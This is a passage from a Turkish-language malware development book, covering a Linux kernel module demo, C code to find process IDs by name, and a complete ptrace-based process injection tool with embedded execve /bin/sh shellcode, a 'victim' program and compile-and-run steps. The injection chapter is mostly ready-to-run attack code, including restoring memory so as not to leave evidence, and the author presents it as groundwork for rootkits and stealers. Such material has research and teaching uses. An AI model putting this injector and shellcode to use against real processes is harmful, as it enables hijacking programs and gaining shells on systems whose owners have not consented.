M=$(PWD) - M değişkenini mevcut çalışma dizinine ($(PWD)) ayarlar, yani modül kaynak kodunun bulunduğu yerdir. Bu, çekirdek derleme sistemine, modül kaynak dosyalarını mevcut dizinde aramasını söyler.
modules - çekirdek derleme sistemindeki bu hedef, obj-m içinde listelenen modülleri derler.
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean bu komut, modül derleme dosyalarını temizler.

Bir terminal açın, hack.c ve Makefile içeren dizine gidin:
+++++++++++++++++++++++++++++++++++++++++++++++


ve modülü derlemek için aşağıdaki komutu çalıştırın:

make
+++++++++++++++++++++++++++++++++++++++++++++++
Sonuç olarak, make komutunu çalıştırdıktan sonra birkaç yeni ara ikili dosya bulacaksınız. Ancak en önemli ekleme, yeni bir hack.ko dosyasının varlığı olacaktır.
Şimdi sırada ne var? Yeni bir terminal açın ve dmesg komutunu çalıştırın:
Dmesg
+++++++++++++++++++++++++++++++++++++++++++++++

Daha sonra, hack.ko dizininizden çalışan çekirdeğe bu modülü yüklemek için aşağıdaki komutu çalıştırın:
sudo insmod hack.ko
Şimdi, yeni bir terminalden dmesg çıktısını tekrar kontrol ederseniz, "Meow-meow!" satırını görmelisiniz:
+++++++++++++++++++++++++++++++++++++++++++++++
Çalışan çekirdekten modülümüzü silmek için sadece şu komutu çalıştırın:
sudo rmmod hack
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++
Gördüğünüz gibi, çekirdek arabelleğinde "Meow-bow!" mesajı var, yani her şey beklendiği gibi mükemmel şekilde çalıştı!=..=
Tabii ki, bir uyarı daha var. Bir Linux çekirdek modülü oluştururken, modülün derlendiği belirli çekirdek sürümüne ait olduğunu unutmamak önemlidir. Eğer farklı bir çekirdeğe sahip bir sisteme modülü yüklemeye çalışırsanız, büyük olasılıkla yüklenmeyecektir.
Burada bir mola vereceğimizi düşünüyorum, rootkit ve stealer konularına bir sonraki gönderilerde bakacağız. 
Umarım bu pratik örnek içeren gönderi, kötü amaçlı yazılım araştırmacıları, Linux programcıları ve Linux çekirdek programlama teknikleriyle ilgilenen herkes için faydalı olmuştur.
Github’taki kaynak kod

99. linux kötü amaçlı yazılım geliştirme 2: işlemi ID’ye göre bulma. Basit C örneği.

﷽

+++++++++++++++++++++++++++++++++++++++++++++++
Linux için kötü amaçlı yazılım programlarken rootkitler ve diğer ilginç ve kötü şeyler hakkında ışık tutacağımı söz verdim, ancak başlamadan önce basit şeyler yapmayı deneyelim.
Bazı okuyucularım, örneğin, Linux süreçlerine kod enjeksiyonu yapmanın nasıl olduğunu bilmiyorlar.
Beni çok uzun süredir okuyanlar, enjeksiyon amaçları için Windows'ta process ID bulmaya yönelik böyle ilginç ve basit bir örneği hatırlarlar.
pratik örnek
Hadi Linux için benzer bir mantık uygulayalım. Her şey çok basit:
/*
* hack.c
* linux hacking part 2:
* find process ID by name
* author @cocomelonc
* https://cocomelonc.github.io/linux/2024/09/16/linux-hacking-2.html
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <ctype.h>

int find_process_by_name(const char *proc_name) {
DIR *dir;
struct dirent *entry;
int pid = -1;

dir = opendir("/proc");
if (dir == NULL) {
perror("opendir /proc failed");
return-1;
}

while ((entry = readdir(dir)) != NULL) {
if (isdigit(*entry->d_name)) {
char path[512];
snprintf(path, sizeof(path), "/proc/%s/comm", entry->d_name);

FILE *fp = fopen(path, "r");
if (fp) {
char comm[512];
if (fgets(comm, sizeof(comm), fp) != NULL) {
// remove trailing newline from comm
comm[strcspn(comm, "\r\n")] = 0;
if (strcmp(comm, proc_name) == 0) {
pid = atoi(entry->d_name);
fclose(fp);
break;
}
}
fclose(fp);
                 }
}
}
closedir(dir);
return pid;
}

int main(int argc, char *argv[]) {
if (argc != 2) {
fprintf(stderr, "usage: %s <process_name>\n", argv[0]);
return 1;
}

int pid = find_process_by_name(argv[1]);
if (pid != -1) {
	printf("found pid: %d\n", pid);
} else {
	printf("process '%s' not found.\n", argv[1]);
}
return 0;
}

Kodum, Linux'ta çalışan bir süreci adını tarayarak /proc dizininde nasıl arayacağınızı gösteriyor./proc/[pid]/comm içinde depolanan süreç adlarını okur ve bir eşleşme bulursa hedef sürecin process ID (PID) değerini alır.
Gördüğünüz gibi burada sadece iki fonksiyon var. Öncelikle, find_process_by_name fonksiyonunu uyguladık.Bu fonksiyon, /proc dizini içinde süreç adını aramaktan sorumludur.
Bir süreç adı (proc_name) alır ve bulunan sürecin PID değerini döndürür veya süreç bulunmazsa -1 döndürür.
Fonksiyon, opendir() fonksiyonunu kullanarak /proc dizinini açar. Bu dizin, çalışan süreçler hakkında bilgi içerir ve her alt dizin bir process ID (PID) ile adlandırılmıştır.
Daha sonra, /proc içindeki girişleri yineleyin:
while ((entry = readdir(dir)) != NULL) {
readdir() fonksiyonu, /proc dizinindeki tüm girişleri yinelemek için kullanılır, her giriş ya çalışan bir süreci (eğer giriş adı bir sayıysa) ya da diğer sistem dosyalarını temsil eder.
Daha sonra, giriş adının bir sayı olup olmadığını (yani bir process ID'yi) temsil edip etmediğini kontrol eder. Sadece rakamlarla adlandırılmış dizinler /proc içinde geçerli süreç dizinleridir:
if (isdigit(*entry->d_name)) {
Dikkat edilmelidir ki, her /proc/[pid] dizini içindeki comm dosyası, o sürece bağlı yürütülebilir dosyanın adını içerir:
snprintf(path, sizeof(path), "/proc/%s/comm", entry->d_name);
Bu, /proc/, process ID (d_name) ve /comm birleştirilerek comm dosyasının tam yolunun oluşturulduğu anlamına gelir.
Son olarak, comm dosyasını açar, süreç adını okur ve karşılaştırır:
FILE *fp = fopen(path, "r");
if (fp) {
char comm[512];
if (fgets(comm, sizeof(comm), fp) != NULL) {
// remove trailing newline from comm
comm[strcspn(comm, "\r\n")] = 0;
if (strcmp(comm, proc_name) == 0) {
pid = atoi(entry->d_name);
fclose(fp);
break;
	}
        }

Daha sonra, elbette, dizini kapatın ve geri dönün.
İkinci fonksiyon ise main fonksiyondur:
int main(int argc, char *argv[]) {
if (argc != 2) {
fprintf(stderr, "usage: %s <process_name>\n", argv[0]);
return 1;
}

int pid = find_process_by_name(argv[1]);
if (pid != -1) {
	printf("found pid: %d\n", pid);
} else {
	printf("process '%s' not found.\n", argv[1]);
}
return 0;
}
Sadece komut satırı argümanlarını kontrol edin ve süreç bulma mantığını çalıştırın.
Demo

Her şeyin çalıştığını kontrol edelim. Derleyin:
gcc -z execstack hack.c -o hack
+++++++++++++++++++++++++++++++++++++++++++++++
Daha sonra Linux makinesinde çalıştırın:
.\hack [process_name]
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++
Gördüğünüz gibi, her şey mükemmel çalıştı. Benim durumumda Telegram ID (75678) bulduk!=..=
Her şey çok kolay görünüyor, değil mi?

Ancak burada bir püf noktası var. Eğer örneğimde olduğu gibi firefox gibi işlemler için çalıştırmaya çalışırsak:
.\hack firefox
şunu alırız:
+++++++++++++++++++++++++++++++++++++++++++++++

Karşılaştığımız sorun, firefox gibi bazı işlemlerin alt işlemler veya birden fazla iş parçacığı oluşturabilmesi ve bunların hepsinin process adlarını comm dosyasında saklamayabilmesi olabilir.
/ proc/[pid]/comm dosyası, çalıştırılabilir dosyanın adını tam yol olmadan saklar ve özellikle aynı ebeveyn altında birden fazla iş parçacığı veya alt işlem varsa, işlemin tüm örneklerini yansıtmayabilir.
Bu yüzden olası sorunlar şu olabilir:
/proc/[pid]/comm içinde farklı işlem adları: alt işlemler veya iş parçacıkları farklı adlandırma kuralları kullanabilir veya firefox olarak /proc/[pid]/comm altında listelenmeyebilir.
zombiler veya yetim işlemler: bazı işlemler, zombi veya yetim durumda olmaları halinde doğru şekilde görünmeyebilir.
practical example 2

Comm dosyasını okumak yerine, süreci başlatmak için kullanılan tam komutu (işlem adı, tam yol ve argümanlar dahil) içeren /proc/[pid]/cmdline dosyasını kontrol edebiliriz.
Bu dosya, firefox gibi birden fazla instance oluşturan işlemler için daha güvenilirdir.
Bu yüzden başka bir versiyon (hack2.c) oluşturdum:
/*
* hack2.c
* linux hacking part 2:
* find processes ID by name
* author @cocomelonc
* https://cocomelonc.github.io/linux/2024/09/16/linux-hacking-2.html
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <ctype.h>

void find_processes_by_name(const char *proc_name) {
DIR *dir;
struct dirent *entry;
int found = 0;

dir = opendir("/proc");
if (dir == NULL) {
perror("opendir /proc failed");
return;
}
while ((entry = readdir(dir)) != NULL) {
if (isdigit(*entry->d_name)) {
char path[512];
snprintf(path, sizeof(path), "/proc/%s/cmdline", entry->d_name);

FILE *fp = fopen(path, "r");
if (fp) {
char cmdline[512];
if (fgets(cmdline, sizeof(cmdline), fp) != NULL) {
// command line arguments are separated by '\0',
// we only need the first argument (the program name)
cmdline[strcspn(cmdline, "\0")] = 0;

// perform case-insensitive comparison
// of the base process name
const char *base_name = strrchr(cmdline, '/');
base_name = base_name ? base_name + 1 : cmdline;

if (strcasecmp(base_name, proc_name) == 0) {
printf("found process: %s with PID: %s\n", base_name,
entry->d_name);
found = 1;
}
}
fclose(fp);
}
}
}

if (!found) {
	printf("no processes found with the name '%s'.\n", proc_name);
}

closedir(dir);
}
int main(int argc, char *argv[]) {
if (argc != 2) {
fprintf(stderr, "usage: %s <process_name>\n", argv[0]);
return 1;
}
find_processes_by_name(argv[1]);
return 0;
}
Gördüğünüz gibi, bu kodun güncellenmiş bir versiyonudur ve bunun yerine /proc/[pid]/cmdline dosyasını okur.


Ancak /proc/[pid]/cmdline veya /proc/[pid]/status dosyası her zaman tüm alt işlemleri veya iş parçacıklarını doğru şekilde göstermeyebilir.
demo 2

İkinci örneği çalıştırarak kontrol edelim. Derleyin:
gcc -z execstack hack2.c -o hack2
+++++++++++++++++++++++++++++++++++++++++++++++
Daha sonra Linux makinesinde çalıştırın:
.\hack [process_name]
+++++++++++++++++++++++++++++++++++++++++++++++
Gördüğünüz gibi, doğru.
Umarım bu pratik örnek içeren gönderi, malware araştırmacıları, Linux programcıları ve Linux çekirdek programlama ile kod enjeksiyon teknikleriyle ilgilenen herkes için faydalıdır.
Find process ID by name. Windows version
Github’taki kaynak kod



100. Linux kötü amaçlı yazılım geliştirme 3: ptrace ile Linux işlem enjeksiyonu. Basit C örneği.

﷽
+++++++++++++++++++++++++++++++++++++++++++++++
Bilinen enjeksiyon tekniklerinin sayısı Windows makinelerde çok büyük, örneğin:
ilk, ikinci veya üçüncü örnekler blogumdan.


Bugün, ptrace sistem çağrısını kullanarak harika bir Linux enjeksiyon tekniğini göstereceğim.
Ptrace'ı, diğer işlemleri incelemek, değiştirmek ve hatta ele geçirmek için kişisel anahtarınız olarak düşünün.
ptrace
ptrace, uzak işlemleri hata ayıklamanıza izin veren bir sistem çağrısıdır. Başlatan işlem, hata ayıklanan işlemin belleğini ve yazmaçlarını inceleyebilir ve değiştirebilir. Örneğin, GDB, hata ayıklanan süreci kontrol etmek için ptrace kullanır.
+++++++++++++++++++++++++++++++++++++++++++++++

Ptrace, aşağıdakiler gibi birkaç faydalı hata ayıklama işlemi sunar:
PTRACE_ATTACH - bir sürece bağlanmanıza izin verir, hata ayıklanan süreci duraklatır
PTRACE_PEEKTEXT - başka bir sürecin adres alanından veri okumanıza izin verir
PTRACE_POKETEXT - başka bir sürecin adres alanına veri yazmanıza izin verir
PTRACE_GETREGS - sürecin mevcut kayıt durumu okur
PTRACE_SETREGS - sürecin kayıt durumu yazar
PTRACE_CONT - hata ayıklanan sürecin yürütülmesine devam eder
pratik örnek
Bu adım adım eğitimde şunları göstereceğim:
Çalışan bir sürece bağlanma.
Özel shellcode enjekte etme.
Yürütmeyi ele geçirme.
Yürütmeden sonra orijinal durumu geri yükleme.
Her şeyi basit bir pratik C örneği ile açıklayacağız. Haydi başlayalım!
İlk yapmamız gereken, ilgilendiğimiz sürece bağlanmaktır. Bunu yapmak için, ptrace çağrısını PTRACE_ATTACH parametresi ile kullanmak yeterlidir:
printf("attaching to process %d\n", target_pid);
if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) == -1) {
perror("failed to attach");
return 1;
}
Bu, işlemi durdurur ve belleğini ve yazmaçlarını incelememizi sağlar.
İşlemci yazmaçlarında herhangi bir değişiklik yapmadan önce, mevcut durumlarını yedeklemeliyiz. Bu, daha sonraki bir aşamada yürütmeye devam etmemizi sağlar:
struct user_regs_struct target_regs;
//...
//...
// get the current registers
printf("reading process registers\n");
ptrace(PTRACE_GETREGS, target_pid, NULL, &target_regs);
PTRACE_PEEKDATA kullanarak, talimat işaretçisindeki (RIP) belleği okuyoruz.
Bu, enjeksiyondan sonra süreci orijinal durumuna geri yüklemek için çok önemlidir.
Bu nedenle, read_mem adlı bir fonksiyon oluşturdum:
// read memory from the target process
void read_mem(pid_t target_pid, long addr, char *buffer, int len) {
union data_chunk {
long val;
char bytes[sizeof(long)];
} chunk;
int i = 0;
while (i < len / sizeof(long)) {
chunk.val = ptrace(PTRACE_PEEKDATA, target_pid, addr + i * sizeof(long), NULL);
memcpy(buffer + i * sizeof(long), chunk.bytes, sizeof(long));
i++;
}
int remaining = len % sizeof(long);
if (remaining) {
chunk.val = ptrace(PTRACE_PEEKDATA, target_pid, addr + i * sizeof(long), NULL);
memcpy(buffer + i * sizeof(long), chunk.bytes, remaining);
}
}
Bu fonksiyonun adım adım işleyişini göstereyim.

ptrace, belleği sizeof(long) baytlık parçalar halinde okur. Bu birlik (union), veriyi ptrace işlemleri için long olarak ele almamıza ve aynı zamanda bireysel baytlara erişmemize olanak tanır:
union data_chunk {
long val;
char bytes[sizeof(long)];
} chunk;
Daha sonra tam sizeof(long) uzunlukta blokları okuyoruz:
int i = 0;
while (i < len / sizeof(long)) {
chunk.val = ptrace(PTRACE_PEEKDATA, target_pid, addr + i * sizeof(long), NULL);
memcpy(buffer + i * sizeof(long), chunk.bytes, sizeof(long));
i++;
}
Gördüğünüz gibi, burada hedef işlemin belirli bir bellek adresinden bir long (genellikle 64 bit sistemlerde 8 bayt) okuyoruz.Ardından, okunan veri memcpy kullanılarak tampon içine kopyalanır.Bu işlem, tüm sizeof(long) uzunluğundaki bloklar okunana kadar devam eder.
Daha sonra kalan baytları ele alırız:
int remaining = len % sizeof(long);
if (remaining) {
chunk.val = ptrace(PTRACE_PEEKDATA, target_pid, addr + i * sizeof(long), NULL);
memcpy(buffer + i * sizeof(long), chunk.bytes, remaining);
}
Mantık basittir: Eğer uzunluk (len) sizeof(long)'un katı değilse, okunması gereken ekstra baytlar olabilir.
Fonksiyon, bu kalan baytları okumak için bellekte bir long daha okur ve sadece gerekli baytları tampona kopyalar.


Sonuç olarak, hedef işlemin belirli bir adresinden başlayan len baytlık tüm bellek bloğu tampon içine kaydedilir.
PTRACE_POKEDATA ile, özel shellcode'umuzu hedef işlemin belleğine RIP adresinde enjekte ediyoruz.
// write memory into the target process
void write_mem(pid_t target_pid, long addr, char *buffer, int len) {
union data_chunk {
long val;
char bytes[sizeof(long)];
} chunk;
int i = 0;
while (i < len / sizeof(long)) {
memcpy(chunk.bytes, buffer + i * sizeof(long), sizeof(long));
ptrace(PTRACE_POKEDATA, target_pid, addr + i * sizeof(long), chunk.val);
i++;
}
int remaining = len % sizeof(long);
if (remaining) {
memcpy(chunk.bytes, buffer + i * sizeof(long), remaining);
ptrace(PTRACE_POKEDATA, target_pid, addr + i * sizeof(long), chunk.val);
}
}
Gördüğünüz gibi, bu fonksiyon read_mem'e benzer, ancak belleğe yazma mantığını uygular.
Sonraki aşamada, işlemin talimat işaretçisini (RIP) değiştirilerek enjekte edilen payload çalıştırılır:
ptrace(PTRACE_CONT, target_pid, NULL, NULL);
Payload yürütüldükten sonra, işlemi çökertmemek veya kanıt bırakmamak için orijinal bellek talimatlarını geri yüklüyoruz:
write_mem(target_pid, target_regs.rip, original_code, payload_len);
Son olarak, hedef süreçten ayrılarak normal çalışmasına devam etmesini sağlıyoruz:
ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
Yani, kod enjeksiyon "kötü amaçlı yazılımımızın" tam kaynak kodu şu şekildedir (hack.c):
/*
* hack.c
* practical example of linux process injection
* author @cocomelonc
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <unistd.h>

// read memory from the target process
void read_mem(pid_t target_pid, long addr, char *buffer, int len) {
union data_chunk {
long val;
char bytes[sizeof(long)];
} chunk;
int i = 0;
while (i < len / sizeof(long)) {
chunk.val = ptrace(PTRACE_PEEKDATA, target_pid, addr + i * sizeof(long), NULL);
memcpy(buffer + i * sizeof(long), chunk.bytes, sizeof(long));
i++;
}
int remaining = len % sizeof(long);
if (remaining) {
chunk.val = ptrace(PTRACE_PEEKDATA, target_pid, addr + i * sizeof(long), NULL);
memcpy(buffer + i * sizeof(long), chunk.bytes, remaining);
}
}

// write memory into the target process
void write_mem(pid_t target_pid, long addr, char *buffer, int len) {
union data_chunk {
long val;
char bytes[sizeof(long)];
} chunk;
int i = 0;
while (i < len / sizeof(long)) {
memcpy(chunk.bytes, buffer + i * sizeof(long), sizeof(long));
ptrace(PTRACE_POKEDATA, target_pid, addr + i * sizeof(long), chunk.val);
i++;
}
int remaining = len % sizeof(long);
if (remaining) {
memcpy(chunk.bytes, buffer + i * sizeof(long), remaining);
ptrace(PTRACE_POKEDATA, target_pid, addr + i * sizeof(long), chunk.val);
}
}

int main(int argc, char *argv[]) {
if (argc != 2) {
printf("usage: %s <target_pid>\n", argv[0]);
return 1;
}

pid_t target_pid = atoi(argv[1]);
char payload[] = "\x48\x31\xf6\x56\x48\xbf\x2f\x62"
"\x69\x6e\x2f\x2f\x73\x68\x57\x54"
"\x5f\x6a\x3b\x58\x99\x0f\x05"; // execve /bin/sh
int payload_len = sizeof(payload) - 1;
char original_code[payload_len];

struct user_regs_struct target_regs;

// attach to the target process
printf("attaching to process %d\n", target_pid);
if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) == -1) {
perror("failed to attach :(");
return 1;
}
waitpid(target_pid, NULL, 0);

// get the current registers
printf("reading process registers\n");
ptrace(PTRACE_GETREGS, target_pid, NULL, &target_regs);

// backup the memory at RIP
printf("backing up target memory\n");
read_mem(target_pid, target_regs.rip, original_code, payload_len);

// inject the payload
printf("injecting payload\n");
write_mem(target_pid, target_regs.rip, payload, payload_len);

// hijack execution
printf("hijacking process execution\n");
ptrace(PTRACE_CONT, target_pid, NULL, NULL);

// wait for the payload to execute
wait(NULL);

// restore the original code
printf("restoring original process memory\n");
write_mem(target_pid, target_regs.rip, original_code, payload_len);

// detach from the process
printf("detaching from process\n");
ptrace(PTRACE_DETACH, target_pid, NULL, NULL);

printf("injection complete\n");
return 0;
}
Ancak bir sorun var.Neden süreç enjeksiyon kodunda waitpid kullanıyoruz?
PTRACE_ATTACH ile bir sürece bağlandığımızda, hedef süreç hemen durmaz.
İşlem, işletim sistemi hata ayıklayıcının (enjeksiyon kodumuzun) kontrolü ele aldığını gösteren bir sinyal gönderene kadar çalışmaya devam eder.
waitpid kullanarak, hedef sürecin tamamen durduğundan emin olana kadar enjeksiyon kodumuzun çalışmasını engelleriz:
ptrace(PTRACE_ATTACH, target_pid, NULL, NULL);
waitpid(target_pid, NULL, 0);
waitpid olmadan, işletim sistemi hedef sürecin tamamen durduğunu garanti etmeden belleği okumaya veya değiştirmeye çalışabiliriz.Bu da belirsiz davranışlara neden olabilir.
Ayrıca, süreç enjeksiyonu sırasında genellikle enjekte edilen shellcode'un yürütmeyi tamamladığını tespit etmemiz gerekir.
Bunu yapmak için, int 0x3 gibi bir yazılım kesmesi kullanırız.
Bu, hedef işlemde bir SIGTRAP sinyali tetikleyerek süreci duraklatır ve waitpid aracılığıyla tekrar kontrolü ele almamızı sağlar.
Peki ya wait fonksiyonu?wait fonksiyonu nedir ve ne zaman kullanılır?
wait fonksiyonu, waitpid'in daha basit bir çeşididir.Herhangi bir alt işlemin durum değiştirmesini bekler.waitpid'in aksine, belirli bir ID belirtmemize veya gelişmiş seçenekleri kullanmamıza izin vermez.
Süreç enjeksiyonu bağlamında genellikle wait kullanmayız, çünkü belirli bir süreci (hedefimizi) kontrol etmek isteriz ve waitpid bunu sağlar.
Ancak, birden fazla alt işlem olduğunda ve hangi alt işlemin durum değiştirdiğini umursamıyorsak wait kullanılabilir.
Bu nedenle, waitpid'i stratejik bir şekilde kullanarak sorunsuz ve güvenilir bir süreç enjeksiyonu gerçekleştirebiliriz.
Basit bir payload kullandım: 
char payload[] = 
"\x48\x31\xf6\x56\x48\xbf\x2f\x62"
"\x69\x6e\x2f\x2f\x73\x68\x57\x54"
"\x5f\x6a\x3b\x58\x99\x0f\x05"; // execve /bin/sh
demo
Öncelikle, gösterim amacıyla bir "kurban" sürece ihtiyacımız var.

Sonsuz döngü içinde çalışan, belirli aralıklarla mesaj yazdıran basit bir "kurban" işlemi yazdım.Bu program, gerçek bir çalışan süreci simüle eder:
/*
* meow.c
* simple "victim" process for injection testing
* author @cocomelonc
* https://cocomelonc.github.io/malware/2024/11/22/linux-hacking-3.html
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
printf("victim process started. PID: %d\n", getpid());
while (1) {
printf("meow-meow... PID: %d\n", getpid());
sleep(5); // simulate periodic activity
}
return 0;
}
Kurban süreci derleyelim:
gcc meow.c -o meow
+++++++++++++++++++++++++++++++++++++++++++++++
ve hack.c enjeksiyon kodunu derleyelim:
gcc -z execstack hack.c -o hack
+++++++++++++++++++++++++++++++++++++++++++++++

Ubuntu 24.04 VM'de önce kurban süreci çalıştırın:
./meow
Kurban sürecinin yazdırdığı PID’yi not edin:
+++++++++++++++++++++++++++++++++++++++++++++++

Bizim örneğimizde PID = 5987.
Şimdi bu PID’yi hedef alarak enjeksiyon yapabiliriz. Örneğin:
./hack 5987
+++++++++++++++++++++++++++++++++++++++++++++++
Bu, kurban sürece bağlanarak payload'umuzu enjekte edecektir.Bu sırada kurban süreç çalışmaya devam eder:
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++
Gördüğünüz gibi, her şey mükemmel çalıştı! =..=
Son sözler
Bu pratik örnek, ptrace'in özel shellcode enjekte etmek ve bir işlemin yürütme akışını değiştirmek için nasıl kullanılabileceğini göstermektedir.


Elbette ptrace ile yapılan bu teknik yeni değil, ancak meşru işlevselliğin kötüye nasıl kullanılabileceğini vurgulamaktadır.
Umarım bu pratik örnek, kötü amaçlı yazılım araştırmacıları, Linux programcıları ve Linux çekirdek programlama ve kod enjeksiyon teknikleriyle ilgilenen herkes için faydalı olur.
Not: Linux ayrıca process_vm_readv() ve process_vm_writev() sistem çağrılarını sunar, bunlar işlem belleğini okumak ve yazmak için kullanılabilir.
ptrace
Linux malware development 1: intro to kernel hacking. Simple C example
Linux malware development 2: find process ID by name. Simple C example
Github’taki kaynak kod

101.Final
Alhamdulillah, bu kitabı yazmayı bitirdim ve hâlâ kızım Munira ile tedavi sürecimiz devam ediyor. Kitap yazmak her zaman zordur, hatta benim deneyimime rağmen oldukça zor oldu. İnşallah her şey iyi olacak. Ey Âlemlerin Rabbi Allah’ım, kızıma güç ver.
Kitabın adı neden böyle? MD - Malware Development anlamına gelir. MZ imzası, MS-DOS taşınabilir 16-bit EXE formatında kullanılan bir imzadır ve geriye dönük uyumluluk için günümüz PE dosyalarında hâlâ mevcuttur. Ayrıca, MD MZ, My Daughter Munira Zhassulankyzy anlamına gelir.
Bu kitabın en az bir kişiye bile bilgi edinmesi ve siber güvenlik bilimi öğrenmesi konusunda yardımcı olursa çok mutlu olacağım. Kitap ağırlıklı olarak pratik odaklıdır.
Arkadaşlarıma ve meslektaşlarıma derin minnettarlığımı ifade etmek isterim.

Özel teşekkürler Anna Tsyganova ve Duman Sembayev’e.
Tüm örnekler yalnızca eğitim ve araştırma amaçlı pratik vakalardır.
Vakit ayırdığınız için teşekkürler, happy hacking ve hoşça kalın!
Not: Tüm çizimler ve ekran görüntüleri bana aittir.


KASIM 2024
TEŞEKKÜRLER!
COCOMELONC
ZHASSULAN ZHUSSUPOV


Bu kitabın satışından elde edilen gelir, kızım Munira'nın tedavisi ve hayır fonu için kullanılacaktır.
TÜM HAKLARI SAKLIDIR



